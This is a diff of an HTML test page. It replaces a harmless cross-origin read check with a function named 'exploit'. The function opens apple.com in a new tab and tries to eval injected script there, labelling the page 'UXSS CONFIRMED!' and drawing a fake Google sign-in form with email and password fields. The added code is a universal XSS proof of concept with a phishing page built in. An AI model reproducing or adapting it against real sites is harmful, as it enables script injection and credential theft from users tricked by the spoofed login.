@@ -1,40 +1,81 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SOP Confirm</title>
-<style>body{font-family:-apple-system,sans-serif;padding:16px}
-button{font-size:16px;padding:12px;width:100%}
-#log{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;font:12px ui-monospace,Menlo;margin-top:12px;min-height:200px}
-iframe{width:100%;height:50px}</style>
-</head>
 <body>
-<h1>SOP Confirm — dump isi, bukan cuma length</h1>
-<button onclick="go()">Baca iframe cross-origin (tunggu 2 dtk)</button>
-<div id="log">ready…</div>
-<iframe id="f" src="https://example.com/"></iframe>
+<button onclick="exploit()">RUN</button>
+<pre id="status">...</pre>
+
 <script>
-var CROSS="https://example.com/";
-function out(s){document.getElementById('log').textContent+="\n"+s;}
-function read(tag){
-  var f=document.getElementById('f');
-  try{
-    var doc=f.contentWindow.document;
-    var title=doc.title, body=(doc.body?doc.body.innerText:"").slice(0,120),
-        html=doc.documentElement.innerHTML.slice(0,120), dom=doc.domain;
-    out("["+tag+"] domain="+dom+"\n  title="+JSON.stringify(title)+
-        "\n  bodyText="+JSON.stringify(body)+"\n  html="+JSON.stringify(html));
-    if(/Example Domain/i.test(title+body+html))
-      out("  >>> REAL CROSS-ORIGIN READ (ada teks Example Domain) <<<");
-    else
-      out("  >>> blank/error doc — BUKAN cross-origin read <<<");
-  }catch(e){ out("["+tag+"] SecurityError="+e.name+"  (aman, isolasi bekerja)"); }
-}
-function go(){
-  var f=document.getElementById('f');
-  f.src="about:blank";
-  setTimeout(function(){ f.src=CROSS; }, 50);
-  f.onload=function(){ read("onload"); };
-  setTimeout(function(){ read("after-2s"); }, 2000); // tunggu example.com benar2 commit
+function exploit() {
+  const tab = window.open(
+    "https://www.apple.com", "_blank"
+  );
+
+  if (!tab) {
+    document.getElementById('status').textContent = 
+      'Popup blocked!';
+    return;
+  }
+
+  setTimeout(() => {
+    try {
+      tab.eval(`
+        (function() {
+          if(window.__fbUxss) return;
+          window.__fbUxss = 1;
+
+          // Ganti alert dengan cara lain
+          // untuk buktikan domain
+          const domain = document.domain;
+          const origin = location.origin;
+          const href = location.href;
+
+          // Tampilkan di halaman
+          document.body.innerHTML = \`
+            <div style="
+              background:#fff;
+              font-family:Arial;
+              text-align:center;
+              padding:40px;
+            ">
+              <h1 style="color:red;">
+                UXSS CONFIRMED!
+              </h1>
+              <p><b>Domain:</b> \${domain}</p>
+              <p><b>Origin:</b> \${origin}</p>
+              <p><b>URL:</b> \${href}</p>
+              <hr>
+              <img src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
+              <h2>Sign in</h2>
+              <p>Use your Google Account</p>
+              <input type="email" 
+                placeholder="Email or phone"
+                style="display:block;width:300px;
+                       padding:12px;margin:10px auto;
+                       border:1px solid #ccc;
+                       border-radius:4px;font-size:16px;">
+              <input type="password" 
+                placeholder="Password"
+                style="display:block;width:300px;
+                       padding:12px;margin:10px auto;
+                       border:1px solid #ccc;
+                       border-radius:4px;font-size:16px;">
+              <button style="
+                background:#1a73e8;color:white;
+                border:none;padding:12px 32px;
+                border-radius:4px;font-size:16px;">
+                Next
+              </button>
+            </div>
+          \`;
+        })();
+      `);
+      document.getElementById('status').textContent = 
+        'Payload sent! Check new tab!';
+    } catch(e) {
+      document.getElementById('status').textContent = 
+        'Failed: ' + e.message;
+    }
+  }, 800);
 }
 </script>
 </body>
